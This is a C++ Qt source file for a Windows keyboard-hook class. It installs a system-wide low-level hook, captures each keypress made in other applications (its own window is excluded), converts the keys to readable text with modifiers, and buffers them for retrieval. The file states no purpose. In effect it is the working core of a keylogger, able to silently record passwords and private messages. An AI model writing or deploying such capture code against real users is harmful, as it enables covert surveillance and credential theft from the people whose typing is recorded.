#include "keyboardhook.h"
#include <cmath>

// ── Static singleton ─────────────────────────────────────────────────────────
KeyboardHook *KeyboardHook::s_instance = nullptr;

// ── Constructor / Destructor ──────────────────────────────────────────────────
KeyboardHook::KeyboardHook()
    : m_hook(nullptr)
{
}

KeyboardHook::~KeyboardHook()
{
    uninstall();
}

// ── Public API ────────────────────────────────────────────────────────────────
bool KeyboardHook::install()
{
    if (m_hook != nullptr) return true; // already installed

    s_instance = this;
    m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, GetModuleHandle(NULL), 0);
    return (m_hook != nullptr);
}

void KeyboardHook::uninstall()
{
    if (m_hook != nullptr) {
        UnhookWindowsHookEx(m_hook);
        m_hook = nullptr;
    }
    if (s_instance == this) {
        s_instance = nullptr;
    }
}

QString KeyboardHook::getAndClearBuffer()
{
    m_mutex.lock();
    QString result = m_buffer;
    m_buffer.clear();
    m_mutex.unlock();
    return result;
}

bool KeyboardHook::isInstalled() const
{
    return (m_hook != nullptr);
}

// ── Static callback ───────────────────────────────────────────────────────────
LRESULT CALLBACK KeyboardHook::hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && s_instance != nullptr) {
        KBDLLHOOKSTRUCT *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        if (isKeyDown) {
            // Only record keystrokes from other processes — not our own app
            HWND hwnd = GetForegroundWindow();
            if (hwnd != NULL) {
                DWORD foregroundPid;
                GetWindowThreadProcessId(hwnd, &foregroundPid);

                if (foregroundPid != GetCurrentProcessId()) {
                    QString key = keyName(static_cast<int>(kbStruct->vkCode));
                    if (!key.isEmpty()) {
                        s_instance->m_mutex.lock();
                        s_instance->m_buffer += key;
                        s_instance->m_mutex.unlock();
                    }
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ── Key-name helper ───────────────────────────────────────────────────────────
QString KeyboardHook::keyName(int vkCode)
{
    // Named special keys
    switch (vkCode) {
        case VK_RETURN:  return "[Enter]";
        case VK_BACK:    return "[Backspace]";
        case VK_TAB:     return "[Tab]";
        case VK_ESCAPE:  return "[Escape]";
        case VK_SPACE:   return " ";
        case VK_SHIFT:   return "[Shift]";
        case VK_CONTROL: return "[Ctrl]";
        case VK_MENU:    return "[Alt]";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_LWIN:    return "[Win]";
        case VK_RWIN:    return "[Win]";
        case VK_APPS:    return "[Menu]";
        case VK_INSERT:  return "[Insert]";
        case VK_DELETE:  return "[Delete]";
        case VK_HOME:    return "[Home]";
        case VK_END:     return "[End]";
        case VK_PRIOR:   return "[PageUp]";
        case VK_NEXT:    return "[PageDown]";
        case VK_LEFT:    return "[Left]";
        case VK_RIGHT:   return "[Right]";
        case VK_UP:      return "[Up]";
        case VK_DOWN:    return "[Down]";
        case VK_F1:      return "[F1]";
        case VK_F2:      return "[F2]";
        case VK_F3:      return "[F3]";
        case VK_F4:      return "[F4]";
        case VK_F5:      return "[F5]";
        case VK_F6:      return "[F6]";
        case VK_F7:      return "[F7]";
        case VK_F8:      return "[F8]";
        case VK_F9:      return "[F9]";
        case VK_F10:     return "[F10]";
        case VK_F11:     return "[F11]";
        case VK_F12:     return "[F12]";
        default:         break;
    }

    // Translate printable keys respecting current modifier state
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    bool ctrlPressed = (keyboardState[VK_CONTROL] & 0x80) != 0;
    bool altPressed  = (keyboardState[VK_MENU]    & 0x80) != 0;
    bool shiftPressed= (keyboardState[VK_SHIFT]   & 0x80) != 0;

    wchar_t buffer[10];
    int result = ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, buffer, 10, 0);

    if (result > 0) {
        QString key = QString::fromWCharArray(buffer, result);

        if (ctrlPressed && altPressed) {
            return QString("[Ctrl+Alt+%1]").arg(key.toUpper());
        } else if (ctrlPressed) {
            return QString("[Ctrl+%1]").arg(key.toUpper());
        } else if (altPressed) {
            return QString("[Alt+%1]").arg(key.toUpper());
        } else if (shiftPressed) {
            return key.toUpper();
        } else {
            return key.toLower();
        }
    }

    return QString();
}
